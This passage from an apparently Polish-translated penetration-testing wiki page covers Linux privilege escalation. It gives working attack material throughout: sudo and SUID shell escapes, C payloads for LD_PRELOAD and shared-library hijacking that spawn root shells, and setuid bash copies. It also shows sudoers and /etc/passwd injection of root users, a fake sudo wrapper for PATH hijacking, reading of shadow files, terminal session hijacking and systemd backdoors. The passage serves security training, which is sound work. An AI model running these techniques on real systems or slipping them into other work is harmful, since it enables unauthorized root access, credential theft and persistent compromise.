<allow send_interface="fi.w1.wpa_supplicant1"/>
<allow receive_sender="fi.w1.wpa_supplicant1" receive_type="signal"/>
</policy>
```
**Dowiedz się, jak enumerować i wykorzystywać komunikację D-Bus tutaj:**

{% content-ref url="d-bus-enumeration-and-command-injection-privilege-escalation.md" %}
[d-bus-enumeration-and-command-injection-privilege-escalation.md](d-bus-enumeration-and-command-injection-privilege-escalation.md)
{% endcontent-ref %}

## **Sieć**

Zawsze warto enumerować sieć i ustalić pozycję maszyny.

### Ogólna enumeracja
```bash
#Hostname, hosts and DNS
cat /etc/hostname /etc/hosts /etc/resolv.conf
dnsdomainname

#Content of /etc/inetd.conf & /etc/xinetd.conf
cat /etc/inetd.conf /etc/xinetd.conf

#Interfaces
cat /etc/networks
(ifconfig || ip a)

#Neighbours
(arp -e || arp -a)
(route || ip n)

#Iptables rules
(timeout 1 iptables -L 2>/dev/null; cat /etc/iptables/* | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null)

#Files used by network services
lsof -i
```
### Otwarte porty

Zawsze sprawdzaj usługi sieciowe działające na maszynie, z którymi nie mogłeś się wcześniej skontaktować:
```bash
(netstat -punta || ss --ntpu)
(netstat -punta || ss --ntpu) | grep "127.0"
```
### Sniffing

Sprawdź, czy możesz przechwytywać ruch. Jeśli tak, możesz być w stanie zdobyć jakieś poświadczenia.
```
timeout 1 tcpdump
```
## Użytkownicy

### Ogólna enumeracja

Sprawdź **kto** jesteś, jakie **uprawnienia** posiadasz, którzy **użytkownicy** są w systemach, którzy mogą **zalogować** się i którzy mają **uprawnienia root:**
```bash
#Info about me
id || (whoami && groups) 2>/dev/null
#List all users
cat /etc/passwd | cut -d: -f1
#List users with console
cat /etc/passwd | grep "sh$"
#List superusers
awk -F: '($3 == "0") {print}' /etc/passwd
#Currently logged users
w
#Login history
last | tail
#Last log of each user
lastlog

#List all users and their groups
for i in $(cut -d":" -f1 /etc/passwd 2>/dev/null);do id $i;done 2>/dev/null | sort
#Current user PGP keys
gpg --list-keys 2>/dev/null
```
### Big UID

Niektóre wersje Linuxa były dotknięte błędem, który pozwala użytkownikom z **UID > INT\_MAX** na eskalację uprawnień. Więcej informacji: [tutaj](https://gitlab.freedesktop.org/polkit/polkit/issues/74), [tutaj](https://github.com/mirchr/security-research/blob/master/vulnerabilities/CVE-2018-19788.sh) i [tutaj](https://twitter.com/paragonsec/status/1071152249529884674).\
**Wykorzystaj to** używając: **`systemd-run -t /bin/bash`**

### Groups

Sprawdź, czy jesteś **członkiem jakiejkolwiek grupy**, która może przyznać ci uprawnienia roota:

{% content-ref url="interesting-groups-linux-pe/" %}
[interesting-groups-linux-pe](interesting-groups-linux-pe/)
{% endcontent-ref %}

### Clipboard

Sprawdź, czy w schowku znajduje się coś interesującego (jeśli to możliwe)
```bash
if [ `which xclip 2>/dev/null` ]; then
echo "Clipboard: "`xclip -o -selection clipboard 2>/dev/null`
echo "Highlighted text: "`xclip -o 2>/dev/null`
elif [ `which xsel 2>/dev/null` ]; then
echo "Clipboard: "`xsel -ob 2>/dev/null`
echo "Highlighted text: "`xsel -o 2>/dev/null`
else echo "Not found xsel and xclip"
fi
```
### Polityka Haseł
```bash
grep "^PASS_MAX_DAYS\|^PASS_MIN_DAYS\|^PASS_WARN_AGE\|^ENCRYPT_METHOD" /etc/login.defs
```
### Znane hasła

Jeśli **znasz jakiekolwiek hasło** środowiska **spróbuj zalogować się jako każdy użytkownik** używając hasła.

### Su Brute

Jeśli nie przeszkadza ci robienie dużego hałasu i binaria `su` oraz `timeout` są obecne na komputerze, możesz spróbować przeprowadzić brute-force użytkownika za pomocą [su-bruteforce](https://github.com/carlospolop/su-bruteforce).\
[**Linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) z parametrem `-a` również próbuje przeprowadzić brute-force użytkowników.

## Nadużycia zapisywalnego PATH

### $PATH

Jeśli odkryjesz, że możesz **zapisywać w niektórym folderze $PATH**, możesz być w stanie podnieść uprawnienia poprzez **utworzenie tylnego wejścia w zapisywalnym folderze** o nazwie jakiejś komendy, która będzie wykonywana przez innego użytkownika (najlepiej root) i która **nie jest ładowana z folderu, który znajduje się przed** twoim zapisywalnym folderem w $PATH.

### SUDO i SUID

Możesz mieć pozwolenie na wykonanie niektórej komendy za pomocą sudo lub mogą mieć bit suid. Sprawdź to używając:
```bash
sudo -l #Check commands you can execute with sudo
find / -perm -4000 2>/dev/null #Find all SUID binaries
```
Niektóre **nieoczekiwane polecenia pozwalają na odczyt i/lub zapis plików lub nawet wykonanie polecenia.** Na przykład:
```bash
sudo awk 'BEGIN {system("/bin/sh")}'
sudo find /etc -exec sh -i \;
sudo tcpdump -n -i lo -G1 -w /dev/null -z ./runme.sh
sudo tar c a.tar -I ./runme.sh a
ftp>!/bin/sh
less>! <shell_comand>
```
### NOPASSWD

Konfiguracja Sudo może pozwolić użytkownikowi na wykonanie niektórych poleceń z uprawnieniami innego użytkownika bez znajomości hasła.
```
$ sudo -l
User demo may run the following commands on crashlab:
(root) NOPASSWD: /usr/bin/vim
```
W tym przykładzie użytkownik `demo` może uruchomić `vim` jako `root`, teraz uzyskanie powłoki jest trywialne poprzez dodanie klucza ssh do katalogu root lub przez wywołanie `sh`.
```
sudo vim -c '!sh'
```
### SETENV

Ta dyrektywa pozwala użytkownikowi **ustawić zmienną środowiskową** podczas wykonywania czegoś:
```bash
$ sudo -l
User waldo may run the following commands on admirer:
(ALL) SETENV: /opt/scripts/admin_tasks.sh
```
Ten przykład, **oparty na maszynie HTB Admirer**, był **vulnerable** na **PYTHONPATH hijacking**, aby załadować dowolną bibliotekę Pythona podczas wykonywania skryptu jako root:
```bash
sudo PYTHONPATH=/dev/shm/ /opt/scripts/admin_tasks.sh
```
### Sudo execution bypassing paths

**Skok** do odczytu innych plików lub użyj **symlinków**. Na przykład w pliku sudoers: _hacker10 ALL= (root) /bin/less /var/log/\*_
```bash
sudo less /var/logs/anything
less>:e /etc/shadow #Jump to read other files using privileged less
```

```bash
ln /etc/shadow /var/log/new
sudo less /var/log/new #Use symlinks to read any file
```
Jeśli użyto **wildcard** (\*), jest to jeszcze łatwiejsze:
```bash
sudo less /var/log/../../etc/shadow #Read shadow
sudo less /var/log/something /etc/shadow #Red 2 files
```
**Środki zaradcze**: [https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/](https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/)

### Komenda Sudo/binary SUID bez ścieżki komendy

Jeśli **uprawnienia sudo** są przyznane do pojedynczej komendy **bez określenia ścieżki**: _hacker10 ALL= (root) less_ możesz to wykorzystać, zmieniając zmienną PATH
```bash
export PATH=/tmp:$PATH
#Put your backdoor in /tmp and name it "less"
sudo less
```
Ta technika może być również używana, jeśli **suid** binarny **wykonuje inne polecenie bez określenia ścieżki do niego (zawsze sprawdzaj za pomocą** _**strings**_ **zawartość dziwnego binarnego pliku SUID)**.

[Przykłady ładunków do wykonania.](payloads-to-execute.md)

### Binarne pliki SUID z określoną ścieżką polecenia

Jeśli **suid** binarny **wykonuje inne polecenie, określając ścieżkę**, wtedy możesz spróbować **wyeksportować funkcję** o nazwie odpowiadającej poleceniu, które wywołuje plik suid.

Na przykład, jeśli binarny plik suid wywołuje _**/usr/sbin/service apache2 start**_, musisz spróbować stworzyć funkcję i ją wyeksportować:
```bash
function /usr/sbin/service() { cp /bin/bash /tmp && chmod +s /tmp/bash && /tmp/bash -p; }
export -f /usr/sbin/service
```
Then, when you call the suid binary, this function will be executed

### LD\_PRELOAD & **LD\_LIBRARY\_PATH**

Zmienna środowiskowa **LD\_PRELOAD** jest używana do określenia jednej lub więcej bibliotek współdzielonych (.so files), które mają być załadowane przez loadera przed wszystkimi innymi, w tym standardową biblioteką C (`libc.so`). Proces ten jest znany jako preloading biblioteki.

Jednakże, aby utrzymać bezpieczeństwo systemu i zapobiec wykorzystaniu tej funkcji, szczególnie w przypadku **suid/sgid** wykonywalnych, system egzekwuje pewne warunki:

* Loader ignoruje **LD\_PRELOAD** dla wykonywalnych, gdzie rzeczywisty identyfikator użytkownika (_ruid_) nie pasuje do efektywnego identyfikatora użytkownika (_euid_).
* Dla wykonywalnych z suid/sgid, tylko biblioteki w standardowych ścieżkach, które są również suid/sgid, są preładowane.

Podwyższenie uprawnień może wystąpić, jeśli masz możliwość wykonywania poleceń z `sudo`, a wynik `sudo -l` zawiera stwierdzenie **env\_keep+=LD\_PRELOAD**. Ta konfiguracja pozwala na utrzymanie zmiennej środowiskowej **LD\_PRELOAD** i jej rozpoznawanie, nawet gdy polecenia są uruchamiane z `sudo`, co potencjalnie prowadzi do wykonania dowolnego kodu z podwyższonymi uprawnieniami.
```
Defaults        env_keep += LD_PRELOAD
```
Zapisz jako **/tmp/pe.c**
```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
unsetenv("LD_PRELOAD");
setgid(0);
setuid(0);
system("/bin/bash");
}
```
Następnie **skompiluj to** używając:
```bash
cd /tmp
gcc -fPIC -shared -o pe.so pe.c -nostartfiles
```
Na koniec, **escalate privileges** uruchamiając
```bash
sudo LD_PRELOAD=./pe.so <COMMAND> #Use any command you can run with sudo
```
{% hint style="danger" %}
Podobne privesc może być nadużywane, jeśli atakujący kontroluje zmienną środowiskową **LD\_LIBRARY\_PATH**, ponieważ kontroluje ścieżkę, w której będą wyszukiwane biblioteki.
{% endhint %}
```c
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
unsetenv("LD_LIBRARY_PATH");
setresuid(0,0,0);
system("/bin/bash -p");
}
```

```bash
# Compile & execute
cd /tmp
gcc -o /tmp/libcrypt.so.1 -shared -fPIC /home/user/tools/sudo/library_path.c
sudo LD_LIBRARY_PATH=/tmp <COMMAND>
```
### SUID Binary – .so injection

Gdy napotkasz binarny plik z uprawnieniami **SUID**, który wydaje się nietypowy, dobrym zwyczajem jest sprawdzenie, czy poprawnie ładuje pliki **.so**. Można to sprawdzić, uruchamiając następujące polecenie:
```bash
strace <SUID-BINARY> 2>&1 | grep -i -E "open|access|no such file"
```
Na przykład, napotkanie błędu takiego jak _"open(“/path/to/.config/libcalc.so”, O\_RDONLY) = -1 ENOENT (No such file or directory)"_ sugeruje potencjał do wykorzystania.

Aby to wykorzystać, należy stworzyć plik C, powiedzmy _"/path/to/.config/libcalc.c"_, zawierający następujący kod:
```c
#include <stdio.h>
#include <stdlib.h>

static void inject() __attribute__((constructor));

void inject(){
system("cp /bin/bash /tmp/bash && chmod +s /tmp/bash && /tmp/bash -p");
}
```
Ten kod, po skompilowaniu i wykonaniu, ma na celu podniesienie uprawnień poprzez manipulację uprawnieniami plików i uruchomienie powłoki z podniesionymi uprawnieniami.

Skompiluj powyższy plik C do pliku obiektu współdzielonego (.so) za pomocą:
```bash
gcc -shared -o /path/to/.config/libcalc.so -fPIC /path/to/.config/libcalc.c
```
Ostatecznie uruchomienie dotkniętego binarnego pliku SUID powinno wywołać exploit, co może prowadzić do kompromitacji systemu.

## Przechwytywanie obiektów współdzielonych
```bash
# Lets find a SUID using a non-standard library
ldd some_suid
something.so => /lib/x86_64-linux-gnu/something.so

# The SUID also loads libraries from a custom location where we can write
readelf -d payroll  | grep PATH
0x000000000000001d (RUNPATH)            Library runpath: [/development]
```
Teraz, gdy znaleźliśmy binarny plik SUID ładujący bibliotekę z folderu, w którym możemy pisać, stwórzmy bibliotekę w tym folderze o odpowiedniej nazwie:
```c
//gcc src.c -fPIC -shared -o /development/libshared.so
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
setresuid(0,0,0);
system("/bin/bash -p");
}
```
Jeśli otrzymasz błąd taki jak
```shell-session
./suid_bin: symbol lookup error: ./suid_bin: undefined symbol: a_function_name
```
to oznacza, że biblioteka, którą wygenerowałeś, musi mieć funkcję o nazwie `a_function_name`.

### GTFOBins

[**GTFOBins**](https://gtfobins.github.io) to starannie wyselekcjonowana lista binarnych plików Unix, które mogą być wykorzystywane przez atakującego do obejścia lokalnych ograniczeń bezpieczeństwa. [**GTFOArgs**](https://gtfoargs.github.io/) jest tym samym, ale w przypadkach, gdy możesz **tylko wstrzykiwać argumenty** w poleceniu.

Projekt zbiera legalne funkcje binarnych plików Unix, które mogą być nadużywane do wydostawania się z ograniczonych powłok, eskalacji lub utrzymywania podwyższonych uprawnień, transferu plików, uruchamiania powłok bind i reverse oraz ułatwiania innych zadań po eksploatacji.

> gdb -nx -ex '!sh' -ex quit\
> sudo mysql -e '! /bin/sh'\
> strace -o /dev/null /bin/sh\
> sudo awk 'BEGIN {system("/bin/sh")}'

{% embed url="https://gtfobins.github.io/" %}

{% embed url="https://gtfoargs.github.io/" %}

### FallOfSudo

Jeśli masz dostęp do `sudo -l`, możesz użyć narzędzia [**FallOfSudo**](https://github.com/CyberOne-Security/FallofSudo), aby sprawdzić, czy znajdzie sposób na wykorzystanie jakiejkolwiek reguły sudo.

### Ponowne użycie tokenów Sudo

W przypadkach, gdy masz **dostęp do sudo**, ale nie znasz hasła, możesz eskalować uprawnienia, **czekając na wykonanie polecenia sudo, a następnie przejmując token sesji**.

Wymagania do eskalacji uprawnień:

* Już masz powłokę jako użytkownik "_sampleuser_"
* "_sampleuser_" **użył `sudo`** do wykonania czegoś w **ostatnich 15 minutach** (domyślnie to czas trwania tokena sudo, który pozwala nam używać `sudo` bez wprowadzania hasła)
* `cat /proc/sys/kernel/yama/ptrace_scope` wynosi 0
* `gdb` jest dostępny (możesz być w stanie go przesłać)

(Możesz tymczasowo włączyć `ptrace_scope` za pomocą `echo 0 | sudo tee /proc/sys/kernel/yama/ptrace_scope` lub trwale modyfikując `/etc/sysctl.d/10-ptrace.conf` i ustawiając `kernel.yama.ptrace_scope = 0`)

Jeśli wszystkie te wymagania są spełnione, **możesz eskalować uprawnienia używając:** [**https://github.com/nongiach/sudo\_inject**](https://github.com/nongiach/sudo_inject)

* **Pierwszy exploit** (`exploit.sh`) utworzy binarny plik `activate_sudo_token` w _/tmp_. Możesz go użyć do **aktywacji tokena sudo w swojej sesji** (nie otrzymasz automatycznie powłoki roota, wykonaj `sudo su`):
```bash
bash exploit.sh
/tmp/activate_sudo_token
sudo su
```
* Drugi exploit (`exploit_v2.sh`) utworzy powłokę sh w _/tmp_ **należącą do roota z ustawionym setuid**
```bash
bash exploit_v2.sh
/tmp/sh -p
```
* Trzeci **eksploit** (`exploit_v3.sh`) **utworzy plik sudoers**, który **sprawi, że tokeny sudo będą wieczne i pozwoli wszystkim użytkownikom na korzystanie z sudo**
```bash
bash exploit_v3.sh
sudo su
```
### /var/run/sudo/ts/\<Username>

Jeśli masz **uprawnienia do zapisu** w folderze lub w którymkolwiek z utworzonych plików w tym folderze, możesz użyć binarnego [**write\_sudo\_token**](https://github.com/nongiach/sudo_inject/tree/master/extra_tools), aby **utworzyć token sudo dla użytkownika i PID**.\
Na przykład, jeśli możesz nadpisać plik _/var/run/sudo/ts/sampleuser_ i masz powłokę jako ten użytkownik z PID 1234, możesz **uzyskać uprawnienia sudo** bez potrzeby znajomości hasła, wykonując:
```bash
./write_sudo_token 1234 > /var/run/sudo/ts/sampleuser
```
### /etc/sudoers, /etc/sudoers.d

Plik `/etc/sudoers` oraz pliki w `/etc/sudoers.d` konfigurują, kto może używać `sudo` i w jaki sposób. Te pliki **domyślnie mogą być odczytywane tylko przez użytkownika root i grupę root**.\
**Jeśli** możesz **odczytać** ten plik, możesz być w stanie **uzyskać interesujące informacje**, a jeśli możesz **zapisać** jakikolwiek plik, będziesz w stanie **eskalować uprawnienia**.
```bash
ls -l /etc/sudoers /etc/sudoers.d/
ls -ld /etc/sudoers.d/
```
Jeśli potrafisz pisać, możesz nadużyć tego uprawnienia.
```bash
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers.d/README
```
Inny sposób na nadużycie tych uprawnień:
```bash
# makes it so every terminal can sudo
echo "Defaults !tty_tickets" > /etc/sudoers.d/win
# makes it so sudo never times out
echo "Defaults timestamp_timeout=-1" >> /etc/sudoers.d/win
```
### DOAS

Istnieją pewne alternatywy dla binarki `sudo`, takie jak `doas` dla OpenBSD, pamiętaj, aby sprawdzić jego konfigurację w `/etc/doas.conf`
```
permit nopass demo as root cmd vim
```
### Sudo Hijacking

Jeśli wiesz, że **użytkownik zazwyczaj łączy się z maszyną i używa `sudo`** do eskalacji uprawnień, a ty uzyskałeś powłokę w kontekście tego użytkownika, możesz **utworzyć nowy plik wykonywalny sudo**, który wykona twój kod jako root, a następnie polecenie użytkownika. Następnie **zmodyfikuj $PATH** kontekstu użytkownika (na przykład dodając nową ścieżkę w .bash\_profile), aby gdy użytkownik wykona sudo, twój plik wykonywalny sudo został uruchomiony.

Zauważ, że jeśli użytkownik używa innej powłoki (nie bash), będziesz musiał zmodyfikować inne pliki, aby dodać nową ścieżkę. Na przykład[ sudo-piggyback](https://github.com/APTy/sudo-piggyback) modyfikuje `~/.bashrc`, `~/.zshrc`, `~/.bash_profile`. Możesz znaleźć inny przykład w [bashdoor.py](https://github.com/n00py/pOSt-eX/blob/master/empire_modules/bashdoor.py)

Lub uruchamiając coś takiego:
```bash
cat >/tmp/sudo <<EOF
#!/bin/bash
/usr/bin/sudo whoami > /tmp/privesc
/usr/bin/sudo "\$@"
EOF
chmod +x /tmp/sudo
echo ‘export PATH=/tmp:$PATH’ >> $HOME/.zshenv # or ".bashrc" or any other

# From the victim
zsh
echo $PATH
sudo ls
```
## Shared Library

### ld.so

Plik `/etc/ld.so.conf` wskazuje **skąd pochodzą załadowane pliki konfiguracyjne**. Zazwyczaj plik ten zawiera następującą ścieżkę: `include /etc/ld.so.conf.d/*.conf`

To oznacza, że pliki konfiguracyjne z `/etc/ld.so.conf.d/*.conf` będą odczytywane. Te pliki konfiguracyjne **wskazują na inne foldery**, w których **biblioteki** będą **wyszukiwane**. Na przykład, zawartość `/etc/ld.so.conf.d/libc.conf` to `/usr/local/lib`. **To oznacza, że system będzie szukał bibliotek w `/usr/local/lib`**.

Jeśli z jakiegoś powodu **użytkownik ma uprawnienia do zapisu** w którejkolwiek z wskazanych ścieżek: `/etc/ld.so.conf`, `/etc/ld.so.conf.d/`, dowolny plik w `/etc/ld.so.conf.d/` lub dowolny folder w pliku konfiguracyjnym w `/etc/ld.so.conf.d/*.conf`, może być w stanie podnieść uprawnienia.\
Zobacz **jak wykorzystać tę błędną konfigurację** na następnej stronie:

{% content-ref url="ld.so.conf-example.md" %}
[ld.so.conf-example.md](ld.so.conf-example.md)
{% endcontent-ref %}

### RPATH
```
level15@nebula:/home/flag15$ readelf -d flag15 | egrep "NEEDED|RPATH"
0x00000001 (NEEDED)                     Shared library: [libc.so.6]
0x0000000f (RPATH)                      Library rpath: [/var/tmp/flag15]

level15@nebula:/home/flag15$ ldd ./flag15
linux-gate.so.1 =>  (0x0068c000)
libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0x00110000)
/lib/ld-linux.so.2 (0x005bb000)
```
Kopiując lib do `/var/tmp/flag15/`, będzie on używany przez program w tym miejscu, jak określono w zmiennej `RPATH`.
```
level15@nebula:/home/flag15$ cp /lib/i386-linux-gnu/libc.so.6 /var/tmp/flag15/

level15@nebula:/home/flag15$ ldd ./flag15
linux-gate.so.1 =>  (0x005b0000)
libc.so.6 => /var/tmp/flag15/libc.so.6 (0x00110000)
/lib/ld-linux.so.2 (0x00737000)
```
Następnie utwórz złośliwą bibliotekę w `/var/tmp` za pomocą `gcc -fPIC -shared -static-libgcc -Wl,--version-script=version,-Bstatic exploit.c -o libc.so.6`
```c
#include<stdlib.h>
#define SHELL "/bin/sh"

int __libc_start_main(int (*main) (int, char **, char **), int argc, char ** ubp_av, void (*init) (void), void (*fini) (void), void (*rtld_fini) (void), void (* stack_end))
{
char *file = SHELL;
char *argv[] = {SHELL,0};
setresuid(geteuid(),geteuid(), geteuid());
execve(file,argv,0);
}
```
## Capabilities

Linux capabilities provide a **podzbiór dostępnych uprawnień roota dla procesu**. To skutecznie dzieli uprawnienia roota **na mniejsze i wyraźne jednostki**. Każda z tych jednostek może być następnie niezależnie przyznawana procesom. W ten sposób pełny zestaw uprawnień jest zmniejszany, co zmniejsza ryzyko wykorzystania.\
Read the following page to **learn more about capabilities and how to abuse them**:

{% content-ref url="linux-capabilities.md" %}
[linux-capabilities.md](linux-capabilities.md)
{% endcontent-ref %}

## Directory permissions

In a directory, the **bit for "execute"** implies that the user affected can "**cd**" into the folder.\
The **"read"** bit implies the user can **list** the **files**, and the **"write"** bit implies the user can **delete** and **create** new **files**.

## ACLs

Access Control Lists (ACLs) represent the secondary layer of discretionary permissions, capable of **overriding the traditional ugo/rwx permissions**. These permissions enhance control over file or directory access by allowing or denying rights to specific users who are not the owners or part of the group. This level of **granularity ensures more precise access management**. Further details can be found [**here**](https://linuxconfig.org/how-to-manage-acls-on-linux).

**Give** user "kali" read and write permissions over a file:
```bash
setfacl -m u:kali:rw file.txt
#Set it in /etc/sudoers or /etc/sudoers.d/README (if the dir is included)

setfacl -b file.txt #Remove the ACL of the file
```
**Pobierz** pliki z określonymi ACL z systemu:
```bash
getfacl -t -s -R -p /bin /etc /home /opt /root /sbin /usr /tmp 2>/dev/null
```
## Otwórz sesje powłoki

W **starych wersjach** możesz **przejąć** niektóre sesje **powłoki** innego użytkownika (**root**).\
W **najnowszych wersjach** będziesz mógł **połączyć się** tylko z sesjami ekranu **swojego własnego użytkownika**. Jednak możesz znaleźć **interesujące informacje wewnątrz sesji**.

### przejmowanie sesji ekranu

**Lista sesji ekranu**
```bash
screen -ls
screen -ls <username>/ # Show another user' screen sessions
```
![](<../../.gitbook/assets/image (141).png>)

**Dołącz do sesji**
```bash
screen -dr <session> #The -d is to detach whoever is attached to it
screen -dr 3350.foo #In the example of the image
screen -x [user]/[session id]
```
## przejmowanie sesji tmux

To był problem z **starymi wersjami tmux**. Nie mogłem przejąć sesji tmux (v2.1) utworzonej przez roota jako użytkownik bez uprawnień.

**Lista sesji tmux**
```bash
tmux ls
ps aux | grep tmux #Search for tmux consoles not using default folder for sockets
tmux -S /tmp/dev_sess ls #List using that socket, you can start a tmux session in that socket with: tmux -S /tmp/dev_sess
```
![](<../../.gitbook/assets/image (837).png>)

**Dołącz do sesji**
```bash
tmux attach -t myname #If you write something in this session it will appears in the other opened one
tmux attach -d -t myname #First detach the session from the other console and then access it yourself

ls -la /tmp/dev_sess #Check who can access it
rw-rw---- 1 root devs 0 Sep  1 06:27 /tmp/dev_sess #In this case root and devs can
# If you are root or devs you can access it
tmux -S /tmp/dev_sess attach -t 0 #Attach using a non-default tmux socket
```
Sprawdź **Valentine box z HTB** jako przykład.

## SSH

### Debian OpenSSL Przewidywalny PRNG - CVE-2008-0166

Wszystkie klucze SSL i SSH generowane na systemach opartych na Debianie (Ubuntu, Kubuntu itp.) między wrześniem 2006 a 13 maja 2008 mogą być dotknięte tym błędem.\
Błąd ten występuje podczas tworzenia nowego klucza ssh w tych systemach, ponieważ **możliwe były tylko 32 768 wariantów**. Oznacza to, że wszystkie możliwości można obliczyć i **mając publiczny klucz ssh, można wyszukać odpowiadający klucz prywatny**. Możesz znaleźć obliczone możliwości tutaj: [https://github.com/g0tmi1k/debian-ssh](https://github.com/g0tmi1k/debian-ssh)

### Interesujące wartości konfiguracyjne SSH

* **PasswordAuthentication:** Określa, czy uwierzytelnianie hasłem jest dozwolone. Domyślnie `no`.
* **PubkeyAuthentication:** Określa, czy uwierzytelnianie kluczem publicznym jest dozwolone. Domyślnie `yes`.
* **PermitEmptyPasswords**: Gdy uwierzytelnianie hasłem jest dozwolone, określa, czy serwer zezwala na logowanie do kont z pustymi ciągami haseł. Domyślnie `no`.

### PermitRootLogin

Określa, czy root może logować się za pomocą ssh, domyślnie `no`. Możliwe wartości:

* `yes`: root może logować się za pomocą hasła i klucza prywatnego
* `without-password` lub `prohibit-password`: root może logować się tylko za pomocą klucza prywatnego
* `forced-commands-only`: Root może logować się tylko za pomocą klucza prywatnego i jeśli opcje poleceń są określone
* `no` : nie

### AuthorizedKeysFile

Określa pliki, które zawierają klucze publiczne, które mogą być używane do uwierzytelniania użytkowników. Może zawierać tokeny takie jak `%h`, które zostaną zastąpione katalogiem domowym. **Możesz wskazać ścieżki absolutne** (zaczynające się od `/`) lub **ścieżki względne od katalogu domowego użytkownika**. Na przykład:
```bash
AuthorizedKeysFile    .ssh/authorized_keys access
```
Ta konfiguracja wskaże, że jeśli spróbujesz zalogować się za pomocą **prywatnego** klucza użytkownika "**testusername**", ssh porówna klucz publiczny twojego klucza z tymi znajdującymi się w `/home/testusername/.ssh/authorized_keys` i `/home/testusername/access`

### ForwardAgent/AllowAgentForwarding

Przekazywanie agenta SSH pozwala na **używanie lokalnych kluczy SSH zamiast pozostawiania kluczy** (bez haseł!) na serwerze. Dzięki temu będziesz mógł **przeskoczyć** przez ssh **do hosta** i stamtąd **przeskoczyć do innego** hosta **używając** **klucza** znajdującego się w twoim **początkowym hoście**.

Musisz ustawić tę opcję w `$HOME/.ssh.config` w ten sposób:
```
Host example.com
ForwardAgent yes
```
Zauważ, że jeśli `Host` to `*`, za każdym razem, gdy użytkownik przeskakuje na inną maszynę, ten host będzie mógł uzyskać dostęp do kluczy (co stanowi problem bezpieczeństwa).

Plik `/etc/ssh_config` może **nadpisać** te **opcje** i zezwolić lub zabronić tej konfiguracji.\
Plik `/etc/sshd_config` może **zezwolić** lub **zabronić** przekazywania ssh-agent za pomocą słowa kluczowego `AllowAgentForwarding` (domyślnie zezwala).

Jeśli stwierdzisz, że Forward Agent jest skonfigurowany w środowisku, przeczytaj następującą stronę, ponieważ **możesz być w stanie to wykorzystać do eskalacji uprawnień**:

{% content-ref url="ssh-forward-agent-exploitation.md" %}
[ssh-forward-agent-exploitation.md](ssh-forward-agent-exploitation.md)
{% endcontent-ref %}

## Ciekawe pliki

### Pliki profili

Plik `/etc/profile` oraz pliki w `/etc/profile.d/` to **skrypty, które są wykonywane, gdy użytkownik uruchamia nową powłokę**. Dlatego, jeśli możesz **zapisać lub zmodyfikować którykolwiek z nich, możesz eskalować uprawnienia**.
```bash
ls -l /etc/profile /etc/profile.d/
```
Jeśli znajdziesz jakikolwiek dziwny skrypt profilu, powinieneś sprawdzić go pod kątem **wrażliwych danych**.

### Pliki Passwd/Shadow

W zależności od systemu operacyjnego pliki `/etc/passwd` i `/etc/shadow` mogą mieć inną nazwę lub może istnieć ich kopia zapasowa. Dlatego zaleca się **znalezienie ich wszystkich** i **sprawdzenie, czy możesz je odczytać**, aby zobaczyć **czy znajdują się w nich hashe**:
```bash
#Passwd equivalent files
cat /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
#Shadow equivalent files
cat /etc/shadow /etc/shadow- /etc/shadow~ /etc/gshadow /etc/gshadow- /etc/master.passwd /etc/spwd.db /etc/security/opasswd 2>/dev/null
```
W niektórych przypadkach można znaleźć **hashe haseł** w pliku `/etc/passwd` (lub równoważnym).
```bash
grep -v '^[^:]*:[x\*]' /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
```
### Writable /etc/passwd

Najpierw wygeneruj hasło za pomocą jednej z następujących komend.
```
openssl passwd -1 -salt hacker hacker
mkpasswd -m SHA-512 hacker
python2 -c 'import crypt; print crypt.crypt("hacker", "$6$salt")'
```
Następnie dodaj użytkownika `hacker` i dodaj wygenerowane hasło.
```
hacker:GENERATED_PASSWORD_HERE:0:0:Hacker:/root:/bin/bash
```
E.g: `hacker:$1$hacker$TzyKlv0/R/c28R.GAeLw.1:0:0:Hacker:/root:/bin/bash`

Możesz teraz użyć polecenia `su` z `hacker:hacker`

Alternatywnie, możesz użyć następujących linii, aby dodać fikcyjnego użytkownika bez hasła.\
OSTRZEŻENIE: możesz pogorszyć obecne bezpieczeństwo maszyny.
```
echo 'dummy::0:0::/root:/bin/bash' >>/etc/passwd
su - dummy
```
NOTE: Na platformach BSD `/etc/passwd` znajduje się w `/etc/pwd.db` i `/etc/master.passwd`, a także `/etc/shadow` jest przemianowane na `/etc/spwd.db`.

Powinieneś sprawdzić, czy możesz **zapisać w niektórych wrażliwych plikach**. Na przykład, czy możesz zapisać w jakimś **pliku konfiguracyjnym usługi**?
```bash
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' 2>/dev/null | grep -v '/proc/' | grep -v $HOME | sort | uniq #Find files owned by the user or writable by anybody
for g in `groups`; do find \( -type f -or -type d \) -group $g -perm -g=w 2>/dev/null | grep -v '/proc/' | grep -v $HOME; done #Find files writable by any group of the user
```
Na przykład, jeśli maszyna działa na serwerze **tomcat** i możesz **zmodyfikować plik konfiguracyjny usługi Tomcat w /etc/systemd/,** wtedy możesz zmodyfikować linie:
```
ExecStart=/path/to/backdoor
User=root
Group=root
```
Twoja tylna furtka zostanie uruchomiona przy następnym uruchomieniu tomcat.

### Sprawdź foldery

Następujące foldery mogą zawierać kopie zapasowe lub interesujące informacje: **/tmp**, **/var/tmp**, **/var/backups, /var/mail, /var/spool/mail, /etc/exports, /root** (Prawdopodobnie nie będziesz w stanie odczytać ostatniego, ale spróbuj)
```bash
ls -a /tmp /var/tmp /var/backups /var/mail/ /var/spool/mail/ /root
```
### Dziwne lokalizacje/Posiadane pliki
```bash
#root owned files in /home folders
find /home -user root 2>/dev/null
#Files owned by other users in folders owned by me
for d in `find /var /etc /home /root /tmp /usr /opt /boot /sys -type d -user $(whoami) 2>/dev/null`; do find $d ! -user `whoami` -exec ls -l {} \; 2>/dev/null; done
#Files owned by root, readable by me but not world readable
find / -type f -user root ! -perm -o=r 2>/dev/null
